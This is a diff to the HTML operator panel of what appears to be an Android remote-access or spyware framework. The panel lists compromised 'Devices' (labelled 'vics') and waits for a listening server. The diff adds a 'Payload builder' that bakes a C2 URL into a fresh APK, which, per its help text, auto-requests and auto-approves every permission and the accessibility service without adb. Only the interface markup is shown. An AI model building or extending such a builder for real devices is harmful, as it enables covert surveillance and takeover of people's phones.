@@ -22,6 +22,8 @@
   #log div { padding: 2px 4px; border-bottom: 1px solid #11161d; }
   #log .in { color: var(--accent); } #log .out { color: var(--ok); }
   #log .err { color: var(--danger); } #log .dim { color: var(--dim); }
+  .build-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+  .build-row input { flex: 1; min-width: 140px; }
 </style>
 </head>
 <body>
@@ -36,10 +38,26 @@
   </div>
 </header>
 <main>
-  <div>
-    <div class="card vics" style="height:100%">
+  <div style="display:flex;flex-direction:column;gap:16px">
+    <div class="card vics">
       <h2>Devices &mdash; click to open lab</h2>
       <div id="vics"><p class="empty">press <b>Listen</b> to start the server…</p></div>
+    </div>
+    <div class="card">
+      <h2>Payload builder &mdash; bake a C2 config into a new APK</h2>
+      <div class="build-row">
+        <label class="dim" style="font-size:12px">C2 url</label>
+        <input type="text" id="burl" value="http://10.0.2.2:42474" placeholder="http://host:42474">
+        <label class="dim" style="font-size:12px">device id (optional)</label>
+        <input type="text" id="bdev" placeholder="my-test-device">
+        <button id="bbuild" class="primary">Build APK</button>
+      </div>
+      <p class="dim" style="font-size:11px;margin:6px 0 0">
+        Runs <code>gradlew assembleDebug -Pc2Url=… -Pc2DeviceId=…</code> locally; the
+        fresh APK auto-requests <b>and auto-approves</b> every permission &amp; activation
+        (accessibility service) — no adb, no PC scripts. APK lands in
+        <code>payloads/</code> + the Downloads panel.
+      </p>
     </div>
   </div>
   <div class="card" style="height:100%">
